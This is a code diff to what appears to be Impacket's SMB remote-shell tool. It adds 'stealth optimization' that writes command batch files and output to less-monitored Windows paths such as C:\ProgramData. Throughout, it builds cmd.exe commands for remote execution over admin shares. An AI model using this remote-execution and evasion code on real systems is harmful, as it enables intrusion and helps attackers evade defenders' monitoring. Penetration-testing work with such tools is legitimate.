@@ -52,7 +52,7 @@ from base64 import b64encode
 
 from impacket.examples import logger
 from impacket.examples.utils import parse_target
-from impacket.examples.name_generators import ServiceNameGenerator, FileNameGenerator, ShareNameGenerator
+from impacket.examples.name_generators import ServiceNameGenerator, FileNameGenerator, ShareNameGenerator, PathGenerator
 from impacket import version, smbserver
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.krb5.keytab import Keytab
@@ -179,7 +179,21 @@ class RemoteShell(cmd.Cmd):
         cmd.Cmd.__init__(self)
         self.__share = share
         self.__mode = mode
-        self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\Temp\\' + OUTPUT_FILENAME
+
+        # Get appropriate path based on share selection (stealth optimization)
+        # Prefer less-monitored paths like C:\Users\Public\Downloads, C:\ProgramData
+        self.__base_path = PathGenerator.get_path_for_share(self.__share, weighted=True)
+        self.__output = '\\\\%COMPUTERNAME%\\' + self.__share + '\\' + self.__base_path + OUTPUT_FILENAME
+
+        # Log path selection when debug mode is enabled
+        logging.debug(f'Share: {self.__share} | Selected path: {self.__base_path}')
+        if self.__share.upper() == 'C$':
+            full_path = 'C:\\' + self.__base_path
+        elif self.__share.upper() == 'ADMIN$':
+            full_path = 'C:\\Windows\\' + self.__base_path
+        else:
+            full_path = self.__base_path
+        logging.debug(f'Full path on target: {full_path}')
         self.__outputBuffer = b''
         self.__command = ''
         self.__shell = 'cmd.exe /Q /c, '
@@ -215,10 +229,11 @@ class RemoteShell(cmd.Cmd):
         if self.__shell_type == 'powershell':
             self.prompt = 'PS C:\\Windows\\System32> '
 
-    def finish(self):        
+    def finish(self):
         # Just in case the ouput file is still in the share
         try:
-            self.transferClient.deleteFile(self.__share, OUTPUT_FILENAME)
+            remote_path = self.__base_path + OUTPUT_FILENAME
+            self.transferClient.deleteFile(self.__share, remote_path)
         except:
             pass
         
@@ -275,8 +290,9 @@ class RemoteShell(cmd.Cmd):
             self.__outputBuffer += data
 
         if self.__mode == 'SHARE':
-            self.transferClient.getFile(self.__share, '\\Temp\\' + OUTPUT_FILENAME, output_callback)
-            self.transferClient.deleteFile(self.__share, '\\Temp\\' + OUTPUT_FILENAME)
+            remote_path = self.__base_path + OUTPUT_FILENAME
+            self.transferClient.getFile(self.__share, remote_path, output_callback)
+            self.transferClient.deleteFile(self.__share, remote_path)
         else:
             fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'rb')
             output_callback(fd.read())
@@ -288,9 +304,24 @@ class RemoteShell(cmd.Cmd):
             data = '$ProgressPreference="SilentlyContinue";' + data
             data = self.__pwsh + b64encode(data.encode('utf-16le')).decode()
 
-        batchFile = '%WINDIR%\\Temp\\' + FileNameGenerator.generate_batch()
-                
-        command = self.__shell + 'echo ' + data + ' ^> %WINDIR%\\Temp\\' + OUTPUT_FILENAME + ' 2^>^&1  > ' + batchFile + ' & ' + \
+        # Generate paths based on share selection for stealth
+        if self.__share.upper() == 'ADMIN$':
+            # ADMIN$ points to %SystemRoot% = C:\Windows
+            base_env = '%SystemRoot%'
+        elif self.__share.upper() == 'C$':
+            # C$ points to C:\ root
+            base_env = 'C:'
+        else:
+            # Generic fallback for other shares
+            base_env = '%SystemRoot%'
+
+        # Construct full paths using base environment variable + dynamic path
+        batch_path = base_env + '\\' + self.__base_path
+        output_path = batch_path
+
+        batchFile = batch_path + FileNameGenerator.generate_batch()
+
+        command = self.__shell + 'echo ' + data + ' ^> ' + output_path + OUTPUT_FILENAME + ' 2^>^&1  > ' + batchFile + ' & ' + \
                   self.__shell + batchFile
 
         if self.__mode == 'SERVER':
